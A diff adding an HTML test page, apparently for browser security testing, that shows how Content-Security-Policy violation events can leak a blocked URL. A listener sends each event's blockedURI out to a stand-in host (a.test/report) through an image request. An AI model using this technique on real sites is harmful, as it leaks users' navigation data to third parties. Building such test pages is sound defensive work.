@@ -1,0 +1,27 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' vulnerabledoma.in">
+    <script>
+      document.addEventListener('securitypolicyviolation', e => {
+        var img = document.createElement('img');
+        img.src = 'https://a.test/report/?leak=f1542194&blockedURI=' + encodeURIComponent(e.blockedURI);
+        document.body.appendChild(img);
+      });
+    </script>
+  </head>
+  <body>
+    <button id="test2">TEST 2</button>
+    <button id="test3">TEST 3</button>
+    <script>
+      document.getElementById('test2').onclick = function() {
+        document.location.href = 'https://www.vulnerabledoma.in/path?query';
+      };
+      document.getElementById('test3').onclick = function() {
+        var link = document.createElement('a');
+        link.href = 'https://www.vulnerabledoma.in/path?query';
+        link.innerText = 'Click here to continue';
+        document.body.appendChild(link);
+      };
+    </script>
+  </body>
+</html>
